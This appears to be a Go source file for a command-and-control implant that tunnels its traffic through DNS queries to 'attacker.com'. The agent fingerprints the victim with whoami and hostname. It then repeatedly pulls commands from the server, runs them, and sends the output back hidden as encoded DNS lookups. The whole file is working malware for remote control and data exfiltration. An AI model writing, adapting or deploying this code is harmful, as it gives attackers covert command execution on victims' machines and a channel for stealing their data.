package main

import (
	"bufio"
	"context"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var (
	// The C2 server's IP address
	serverIP = "127.0.0.1"
	// The C2 server's port
	serverPort = 5353
	// The C2 server's domain
	serverDomain = "attacker.com"
)

func getdict() map[string]string {
	// // Get the dictionary
	// corp := ""
	// // Read from corpus.txt
	// file, err := os.Open("corpus.txt")
	// if err != nil {
	// }
	// defer file.Close()

	// scanner := bufio.NewScanner(file)
	// for scanner.Scan() {
	// 	corp += scanner.Text() + ","
	// }

	// corpus := strings.Split(corp, ",")
	// letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/="
	// inc := 0
	// dict := map[string]string{}

	// // for all combinations of letters set a corpus word for all of them
	// for _, i := range letters {
	// 	for _, j := range letters {
	// 		for _, k := range letters {
	// 			dict[string(i)+string(j)+string(k)] = corpus[inc]
	// 			inc++
	// 		}
	// 	}
	// }

	// // write all the key value pairs from the dictionary to a file
	// file, err = os.Create("dictionary.txt")
	// if err != nil {
	// }
	// defer file.Close()

	// for k, v := range dict {
	// 	file.WriteString(k + ":" + v + "\n")
	// }

	// read from dictionary.txt
	file, err := os.Open("dictionary.txt")
	if err != nil {
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	dict := map[string]string{}
	for scanner.Scan() {
		line := scanner.Text()
		key := strings.Split(line, ":")[0]
		value := strings.Split(line, ":")[1]
		dict[key] = value
	}

	return dict
}

func mnemonicencode(dict map[string]string, str string) string {
	out := dict[string(str[0])+string(str[1])+string(str[2])]

	return out
}

func ipdecode(ips []string) string {
	// Join the lines with a .
	todecode := strings.Join(ips, ".")
	// Split the IPs by .
	ascii_character := strings.Split(todecode, ".")
	// Convert each ascii to a char
	chars := make([]string, len(ascii_character))
	for i, ascii := range ascii_character {
		chars[i] = string(func(a int, _ error) int { return a }(strconv.Atoi(ascii)))
	}
	// Join the chars
	out := strings.Join(chars, "")

	// Strip the spaces from the end
	return strings.TrimSpace(out)
}

func pad(tobepadded string) string {
	// pad to 4 bytes
	for len(tobepadded)%4 != 0 {
		tobepadded += " "
	}
	return tobepadded
}

func queryencode(dict map[string]string, str string) []string {
	str = pad(str)
	// split str into chunks of 3 characters
	chunks := make([]string, len(str)/3)
	for i := 0; i < len(str)/3; i++ {
		chunks[i] = str[i*3 : i*3+3]
	}
	// encode each chunk
	encoded := make([]string, len(chunks))
	for i, chunk := range chunks {
		encoded[i] = dict[chunk]
	}

	return encoded
}

func exfil(dict map[string]string, str string, uid string) string {
	str = base64.StdEncoding.EncodeToString([]byte(str))
	str += "mynuts" + uid

	for _, i := range queryencode(dict, str) {
		// fmt.Println(i)
		dnsquery(i)
		time.Sleep(time.Millisecond * 1)
	}

	return dnsquery(mnemonicencode(dict, "done"))
}

func dnsquery(query string) string {
	// Perform a dns query
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, network, fmt.Sprintf("%s:%d", serverIP, serverPort))
		},
	}
	ip, _ := r.LookupHost(context.Background(), fmt.Sprintf("%s.%s", query, serverDomain))
	return ipdecode(ip)
}

func execute(cmd string) string {
	// Execute a shell command
	out, _ := exec.Command(cmd).CombinedOutput()

	fmt.Println(cmd)

	return string(out)
}

func kill() {
	// Get the current process id
	pid := os.Getpid()
	// Kill the process
	syscall.Kill(pid, 9)
}

func ping(dict map[string]string, uid string) {
	// Send the ping to the C2 server
	response := dnsquery("ping")
	if response == "fingerprint" {
		// Fingerprint machine and send back to c2 server
		switch runtime.GOOS {
		case "windows":
			md5sum := md5.New().Sum([]byte(execute("powershell.exe -c \"whoami\"")))
			uid = fmt.Sprintf("%x", md5sum)
			fmt.Println(exfil(dict, uid, uid))

		case "linux":
			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
			uid = fmt.Sprintf("%x", md5sum)
			fmt.Println(exfil(dict, uid, uid))

		case "darwin":
			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
			uid = fmt.Sprintf("%x", md5sum)
			fmt.Println(exfil(dict, uid, uid))

		}
	} else {
		kill()
	}
}

func main() {
	// Get the dictionary
	dict := getdict()
	// Agent for the C2 server
	uid := ""
	ping(dict, uid)
	time.Sleep(time.Second * 10)

	for {
		// Get the command from the C2 server
		cmd := dnsquery(fmt.Sprintf("cmd_%s", uid))

		// Execute the command
		out := execute(cmd)
		// Send the output to the C2 server
		fmt.Println(exfil(dict, out, uid))

		time.Sleep(time.Second * 5)
	}
}
